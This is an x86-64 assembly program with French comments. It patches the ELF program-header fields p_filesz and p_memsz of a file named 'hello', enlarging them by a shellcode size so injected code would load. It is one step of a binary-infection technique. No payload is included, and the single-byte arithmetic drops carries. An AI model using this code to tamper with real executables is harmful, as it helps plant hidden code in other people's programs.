section .data
    filename db 'hello', 0
    position dq 488
    buffer db 0
    tailleShellcode dw 0x22
    position_memsz dq 496  ; Position pour p_memsz

section .bss
    file_descriptor resq 1
    p_filesz resb 1
    p_memsz resb 1  ; Réserve de l'espace pour p_memsz

section .text
global _start

_start:

    ; Ouvrir le fichier en lecture/écriture
    mov rax, 2
    mov rdi, filename
    mov rsi, 2  ; O_RDWR
    mov rdx, 0644 ; permissions
    syscall
    mov [file_descriptor], rax

    ; Vérifier si l'ouverture du fichier a réussi
    cmp rax, 0
    jl error

    ; Positionner le curseur pour lire p_filesz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Lire l'octet pour p_filesz
    mov rax, 0
    mov rdi, [file_descriptor]
    mov rsi, buffer
    mov rdx, 1
    syscall

    ; Additionner buffer et tailleShellcode pour p_filesz
    movzx ax, byte [buffer]
    add ax, [tailleShellcode]
    mov [p_filesz], al  ; p_filesz contient la valeur de p_filesz + la taille du shellcode

    ; Repositionner le curseur pour écrire p_filesz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Écrire le contenu de p_filesz
    mov rax, 1
    mov rdi, [file_descriptor]
    lea rsi, [p_filesz]
    mov rdx, 1
    syscall

    ; Positionner le curseur pour lire p_memsz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position_memsz]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Lire l'octet pour p_memsz
    mov rax, 0
    mov rdi, [file_descriptor]
    mov rsi, buffer
    mov rdx, 1
    syscall

    ; Additionner buffer et tailleShellcode pour p_memsz
    movzx ax, byte [buffer]
    add ax, [tailleShellcode]
    mov [p_memsz], al  ; p_memsz contient la valeur de p_memsz + la taille du shellcode

    ; Repositionner le curseur pour écrire p_memsz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position_memsz]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Écrire le contenu de p_memsz
    mov rax, 1
    mov rdi, [file_descriptor]
    lea rsi, [p_memsz]
    mov rdx, 1
    syscall

    ; Fermer le fichier
    mov rax, 3
    mov rdi, [file_descriptor]
    syscall

    ; Sortie normale
    mov rax, 60
    xor rdi, rdi
    syscall

error:
    ; Gestion d'erreur 
    mov rax, 60
    mov rdi, 1  ; Code d'erreur
    syscall
